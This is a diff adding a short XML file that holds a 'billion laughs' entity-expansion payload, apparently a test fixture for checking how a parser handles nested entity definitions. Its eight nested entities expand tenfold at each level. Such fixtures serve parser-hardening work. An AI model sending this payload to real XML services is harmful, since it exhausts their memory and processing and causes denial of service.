@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE hahas [
+<!ENTITY haha "haha">
+<!ENTITY haha2 "&haha;&haha;&haha;&haha;&haha;&haha;&haha;&haha;&haha;&haha;">
+<!ENTITY haha3 "&haha2;&haha2;&haha2;&haha2;&haha2;&haha2;&haha2;&haha2;&haha2;&haha2;">
+<!ENTITY haha4 "&haha3;&haha3;&haha3;&haha3;&haha3;&haha3;&haha3;&haha3;&haha3;&haha3;">
+<!ENTITY haha5 "&haha4;&haha4;&haha4;&haha4;&haha4;&haha4;&haha4;&haha4;&haha4;&haha4;">
+<!ENTITY haha6 "&haha5;&haha5;&haha5;&haha5;&haha5;&haha5;&haha5;&haha5;&haha5;&haha5;">
+<!ENTITY haha7 "&haha6;&haha6;&haha6;&haha6;&haha6;&haha6;&haha6;&haha6;&haha6;&haha6;">
+<!ENTITY haha8 "&haha7;&haha7;&haha7;&haha7;&haha7;&haha7;&haha7;&haha7;&haha7;&haha7;">
+]>
+<hahas>&haha8;</hahas>
+
